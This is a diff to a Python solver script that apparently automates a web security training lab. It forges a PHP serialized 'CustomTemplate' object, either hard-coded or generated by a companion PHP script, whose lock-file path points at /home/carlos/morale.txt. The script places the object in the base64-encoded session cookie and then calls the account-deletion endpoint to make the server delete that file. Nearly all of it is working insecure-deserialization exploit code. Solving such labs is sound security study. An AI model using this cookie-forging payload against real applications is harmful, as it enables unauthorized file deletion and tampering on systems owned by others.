@@ -19,14 +19,12 @@ class Solver:
         self.session.post(self.lab_url + 'login', data=data)
 
     def manipulating_the_object_using_python(self):
-        serialized_object_string = base64.urlsafe_b64decode(unquote_plus(self.session.cookies['session']))
-        new_serialized_object_string = re.sub(rb'"avatar_link";.*;', b'"avatar_link";s:23:"/home/carlos/morale.txt";', serialized_object_string)
-        self.session.cookies['session'] = quote_plus(base64.urlsafe_b64encode(new_serialized_object_string))
+        serialized_object_string = b'O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}'
+        self.session.cookies['session'] = quote_plus(base64.urlsafe_b64encode(serialized_object_string))
 
     def manipulating_the_object_using_php(self):
-        serialized_object_string = base64.urlsafe_b64decode(unquote_plus(self.session.cookies['session']))
-        new_serialized_object_string = subprocess.run(['php', sys.argv[0].replace('.py', '.php'), serialized_object_string.decode()], capture_output=True).stdout
-        self.session.cookies['session'] = quote_plus(base64.urlsafe_b64encode(new_serialized_object_string))
+        serialized_object_string = subprocess.run(['php', sys.argv[0].replace('.py', '.php')], capture_output=True).stdout
+        self.session.cookies['session'] = quote_plus(base64.urlsafe_b64encode(serialized_object_string))
 
     def deleting_the_account(self):
         self.session.post(self.lab_url + 'my-account/delete')
